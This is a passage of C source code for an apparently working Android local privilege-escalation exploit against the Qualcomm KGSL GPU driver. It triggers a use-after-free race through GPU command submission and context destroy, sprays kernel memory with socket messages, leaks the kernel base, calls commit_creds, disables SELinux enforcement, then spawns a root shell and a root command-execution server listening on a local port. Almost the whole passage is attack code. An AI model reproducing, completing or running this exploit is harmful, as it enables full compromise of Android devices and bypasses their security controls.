    listen(srv, 8);
    LOG("[sh] root shell ready on 127.0.0.1:%d\n", ROOT_SHELL_PORT);

    for (;;) {
        int cli = accept(srv, NULL, NULL);
        if (cli < 0) {
            if (errno == EINTR) continue;
            LOG("[sh] accept errno=%d\n", errno);
            usleep(100000);
            continue;
        }
        pid_t pid = fork();
        if (pid == 0) {
            setsid();
            unpin_cpu();

            int fd = open("/proc/self/attr/exec", O_WRONLY);
            if (fd >= 0) {
                ssize_t wn = write(fd, "u:r:shell:s0", 12);
                if (wn != 12) LOG("[sh] attr/exec write short: %zd\n", wn);
                close(fd);
            } else {
                LOG("[sh] attr/exec open errno=%d\n", errno);
            }

            dup2(cli, STDIN_FILENO);
            dup2(cli, STDOUT_FILENO);

            int devnull = open("/dev/null", O_WRONLY);
            if (devnull >= 0) {
                dup2(devnull, STDERR_FILENO);
                close(devnull);
            }

            close(cli); close(srv);

            FILE *in = fdopen(STDIN_FILENO, "r");
            if (!in) _exit(1);

            char line[2048];
            while (fgets(line, sizeof(line), in)) {
                char *nl = strchr(line, '\n');
                if (nl) *nl = '\0';
                if (strlen(line) == 0) continue;

                FILE *cmd = popen(line, "r");
                if (cmd) {
                    char buf[4096];
                    while (fgets(buf, sizeof(buf), cmd)) {
                        write(STDOUT_FILENO, buf, strlen(buf));
                    }
                    pclose(cmd);
                }
            }
            _exit(0);
        }
        close(cli);
        while (waitpid(-1, NULL, WNOHANG) > 0) { }
    }
    return NULL;
}

static void spawn_root_shell_server(void)
{
    pthread_t t;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (pthread_create(&t, &attr, root_shell_server, NULL) != 0)
        LOG("[sh] pthread_create failed: %s\n", strerror(errno));
    pthread_attr_destroy(&attr);
}

static void *destroy_thread(void *arg)
{
    (void)arg;
    pin_cpu();
    LOG("[d] thread up tid=%d\n", (int)syscall(__NR_gettid));
    while (!go_destroy) usleep(50);
    usleep(5000);
    LOG("[d] calling DESTROY ctx=%u\n", ctx_id);

    struct drawctxt_destroy d = { ctx_id };
    errno = 0;
    int r = ioctl(kgsl, IOCTL_CTX_DESTROY, &d);
    LOG("[d] DESTROY r=%d errno=%d (%s)  uid=%d euid=%d\n",
        r, errno, strerror(errno), getuid(), geteuid());

    if (getuid() == 0) ensure_kmsg();

    STAGE("before-spawn-root-shell");
    if (getuid() == 0) spawn_root_shell_server();
    STAGE("after-spawn-root-shell");

    STAGE("before-fork-shell");
    pid_t p = fork();
    if (p == 0) {
        signal(SIGHUP, SIG_DFL); signal(SIGINT, SIG_DFL); signal(SIGTERM, SIG_DFL);
        setgid(0); setuid(0);
        LOG("[c] child uid=%d euid=%d cmd=%s\n",
            getuid(), geteuid(), run_cmd ? run_cmd : "(interactive)");
        if (run_cmd) {
            execl("/system/bin/sh", "sh", "-c", run_cmd, NULL);
            LOG("[c] exec -c FAILED errno=%d\n", errno);
        }
        execl("/system/bin/sh", "-sh", NULL);
        LOG("[c] exec -sh FAILED errno=%d\n", errno);
        execl("/system/bin/toybox", "toybox", "sh", NULL);
        LOG("[c] exec toybox FAILED errno=%d\n", errno);
        _exit(3);
    }
    LOG("[d] shell child pid=%d\n", (int)p);

    STAGE("entering-pause-loop");
    signal(SIGHUP, SIG_IGN); signal(SIGINT, SIG_IGN); signal(SIGTERM, SIG_IGN);

    for (unsigned long hb = 0; ; hb++) {
        LOG("[hb] alive sec=%lu pid=%d uid=%d\n",
            hb * 60, getpid(), getuid());
        unsigned int rem = 60;
        while (rem > 0) rem = (unsigned int)sleep(rem);
    }
    return NULL;
}

static int do_dump(void)
{
    char build[PROP_VALUE_MAX] = {0};
    __system_property_get("ro.build.version.incremental", build);
    if (!build[0]) {
        LOG("[-] ro.build.version.incremental is empty\n");
        return 1;
    }
    if (load_target_by_build(build) != 0) return 1;
    LOG("[*] --dump: values above, exiting without triggering exploit\n");
    return 0;
}

static int do_preflight(void)
{
    LOG("=== preflight (no exploit, no target loaded) ===\n");
    LOG("[*] uid=%d\n", getuid());
    { int f = open("/proc/self/attr/current", O_RDONLY);
      if (f >= 0) { char c[128] = {0}; read(f, c, sizeof(c) - 1); close(f); LOG("[*] ctx=%s\n", c); } }

    errno = 0;
    kgsl = open("/dev/kgsl-3d0", O_RDWR);
    LOG("[*] open /dev/kgsl-3d0: %s (errno=%d)\n",
        kgsl < 0 ? strerror(errno) : "ok", errno);
    if (kgsl < 0) return 1;

    struct drawctxt_create c = { CTX_FLAGS, 0 };
    errno = 0;
    int r = ioctl(kgsl, IOCTL_CTX_CREATE, &c);
    LOG("[*] CTX_CREATE flags=0x%x r=%d errno=%d id=%u\n",
        CTX_FLAGS, r, errno, c.drawctxt_id);
    if (r == 0) { struct drawctxt_destroy d = { c.drawctxt_id }; ioctl(kgsl, IOCTL_CTX_DESTROY, &d); }

    struct galloc a; memset(&a, 0, sizeof(a));
    a.size = 4096; a.flags = MEMFLAGS_KMALLOC;
    errno = 0; r = ioctl(kgsl, IOCTL_GPUOBJ_ALLOC, &a);
    LOG("[*] GPUOBJ_ALLOC r=%d errno=%d id=%u\n", r, errno, a.id);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
        unsigned char cb[192]; memset(cb, 0, sizeof(cb)); *(uint64_t *)cb = 192;
        char d = 0; struct iovec iov = { &d, 1 };
        struct msghdr m; memset(&m, 0, sizeof(m));
        m.msg_iov = &iov; m.msg_iovlen = 1;
        m.msg_control = cb; m.msg_controllen = sizeof(cb);
        errno = 0; ssize_t sr = sendmsg(sv[0], &m, MSG_DONTWAIT);
        LOG("[*] 192B cmsg sendmsg r=%zd errno=%d\n", sr, errno);
        close(sv[0]); close(sv[1]);
    }

    errno = 0;
    if (access(TRACE_FORMAT, R_OK) == 0) {
        LOG("[*] tracefs: %s readable\n", TRACE_FORMAT);
    } else {
        LOG("[*] tracefs: %s NOT readable (errno=%d %s)\n",
            TRACE_FORMAT, errno, strerror(errno));
    }

    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_SOFTWARE; pe.config = PERF_COUNT_SW_TASK_CLOCK;
    pe.size = sizeof(pe); pe.sample_type = PERF_SAMPLE_CALLCHAIN;
    pe.sample_period = 1000000; pe.disabled = 1;
    errno = 0;
    int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    LOG("[*] perf_event_open: %s (errno=%d)\n",
        pfd < 0 ? strerror(errno) : "ok", errno);
    if (pfd >= 0) close(pfd);

    LOG("[*] preflight done\n");
    close(kgsl);
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGHUP,  SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    pin_cpu();

    const char *build_arg = NULL;
    const char *log_path = NULL;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--preflight")) preflight = 1;
        else if (!strcmp(argv[i], "--dump"))    dump_mode = 1;
        else if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) build_arg = argv[++i];
        else if (strcmp(argv[i], "-k") == 0 && i + 1 < argc) kbase = strtoull(argv[++i], NULL, 16);
        else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) run_cmd = argv[++i];
        else if (strcmp(argv[i], "-n") == 0) skip_adbd = 1;
        else if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) log_path = argv[++i];
    }

    if (!log_path) log_path = "/data/local/tmp/kugel.log";
    logfd = open(log_path, O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
    if (logfd < 0) {
        logfd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    }
    if (logfd < 0) {
        LOG("[!] open(%s) failed errno=%d; file logging disabled\n",
            log_path, errno);
    }

    ensure_kmsg();

    LOG("[*] kugel_q2_debug  pid=%d uid=%d\n", getpid(), getuid());
    LOG("[*] log file: %s (fd=%d)\n", log_path, logfd);
    LOG("[*] kmsg fd: %d\n", kmsgfd);

    if (preflight) return do_preflight();
    if (dump_mode) return do_dump();

    {
        char build_buf[PROP_VALUE_MAX] = {0};
        __system_property_get("ro.build.version.incremental", build_buf);
        const char *use = build_arg ? build_arg : build_buf;
        if (!use[0]) { LOG("[-] no build id\n"); return 1; }
        if (load_target_by_build(use) != 0) return 1;
    }

    if (!kbase) {
        STAGE("kaslr-leak-start");
        kbase = kaslr_leak_auto();
        if (!kbase) { LOG("[-] need -k kbase\n"); return 1; }
        STAGE("kaslr-leak-done");
    }
    LOG("[+] kbase=0x%llx commit_creds=0x%llx selinux=0x%llx ret=0x%llx\n",
        (unsigned long long)kbase,
        (unsigned long long)(kbase + OFF_COMMIT_CREDS),
        (unsigned long long)(kbase + OFF_SELINUX_STATE),
        (unsigned long long)(kbase + OFF_RET));

    {
        int enf = -1;
        int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (efd >= 0) { char b[8] = {0}; if (read(efd, b, 7) > 0) enf = atoi(b); close(efd); }
        do_flip = (enf != 0);
        LOG("[*] enforcing=%d -> %s\n", enf,
            do_flip ? "flip selinux_state.enforcing 1->0" : "already permissive, stage1 only");
    }

    errno = 0;
    kgsl = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl < 0) { LOG("[-] open kgsl errno=%d (%s)\n", errno, strerror(errno)); return 1; }

    struct drawctxt_create c = { CTX_FLAGS, 0 };
    errno = 0;
    if (ioctl(kgsl, IOCTL_CTX_CREATE, &c)) {
        LOG("[-] CTX_CREATE errno=%d (%s)\n", errno, strerror(errno)); return 1;
    }
    ctx_id = c.drawctxt_id;
    LOG("[+] ctx=%u\n", ctx_id);

    struct galloc ib; memset(&ib, 0, sizeof(ib));
    ib.size = 4096; ib.flags = MEMFLAGS_KMALLOC;
    errno = 0;
    if (ioctl(kgsl, IOCTL_GPUOBJ_ALLOC, &ib)) {
        LOG("[-] ib alloc errno=%d (%s)\n", errno, strerror(errno)); return 1;
    }
    uint64_t ib_va = gpuaddr_of(ib.id);
    void *ibm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl, (off_t)ib.id << 12);
    if (ibm == MAP_FAILED) { LOG("[-] ib mmap errno=%d\n", errno); return 1; }
    memset(ibm, 0, 4096);
    LOG("[+] ib id=%u gpu=0x%llx\n", ib.id, (unsigned long long)ib_va);

    { static const uint64_t sizes[] = {
          0xFFFFF000ULL, 0x3FFFF000ULL, 0xFFFF000ULL,
          0xFFF000ULL, 0x3FF000ULL, 0xFF00ULL, 0xFF0ULL };
      int nfill = 0;
      for (unsigned s = 0; s < sizeof(sizes)/sizeof(sizes[0]); s++) {
          int n = 0;
          for (;;) {
              struct galloc a; memset(&a, 0, sizeof(a));
              a.size = sizes[s]; a.flags = GPUREADONLY;
              if (ioctl(kgsl, IOCTL_GPUOBJ_ALLOC, &a)) break;
              nfill++; n++;
              if (n > 400) break;
          }
          LOG("[*]   fill sz=0x%llx n=%d\n", (unsigned long long)sizes[s], n);
      }
      LOG("[+] iova filled with %d objects\n", nfill);
    }

    LOG("[*] preparing sockets\n");
    for (int i = 0; i < NSEND; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, send_sv[i])) return 1;
        fill_sock(send_sv[i][0]);
    }
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, main_sv)) return 1;
    fill_sock(main_sv[0]);

    pthread_t th[NSEND], dth;
    for (int i = 0; i < NSEND; i++)
        pthread_create(&th[i], NULL, sender_thread, (void *)(intptr_t)i);
    pthread_create(&dth, NULL, destroy_thread, NULL);
    while (nready < NSEND) usleep(1000);
    LOG("[*] %d senders ready\n", nready);

    struct cmdobj cmd; memset(&cmd, 0, sizeof(cmd));
    cmd.gpuaddr = ib_va; cmd.size = 64; cmd.flags = 2; cmd.id = ib.id;

    struct gcmd gc; memset(&gc, 0, sizeof(gc));
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd;
    gc.cmdsize = sizeof(cmd);
    gc.numcmds = 1;
    gc.context_id = ctx_id;

    STAGE("trigger-gpu-command");
    errno = 0;
    int r = ioctl(kgsl, IOCTL_GPU_COMMAND, &gc);
    LOG("[*] GPU_COMMAND r=%d errno=%d (%s) ts=%u\n",
        r, errno, strerror(errno), gc.timestamp);
    if (r == 0) {
        LOG("[-] submit succeeded -> no UAF, abort\n");
        _exit(2);
    }

    STAGE("uaf-triggered-setting-flags");
    __atomic_store_n(&go_spray, 1, __ATOMIC_SEQ_CST);
    __atomic_store_n(&go_destroy, 1, __ATOMIC_SEQ_CST);
    ssize_t sr = send_fake(main_sv[0]);
    LOG("[m] sendmsg r=%zd errno=%d\n", sr, errno);

    STAGE("main-entering-pause-loop");
    for (unsigned long hb = 0; ; hb++) {
        LOG("[m-hb] alive sec=%lu pid=%d uid=%d\n",
            hb * 60, getpid(), getuid());
        unsigned int rem = 60;
        while (rem > 0) rem = (unsigned int)sleep(rem);
    }
    return 0;
}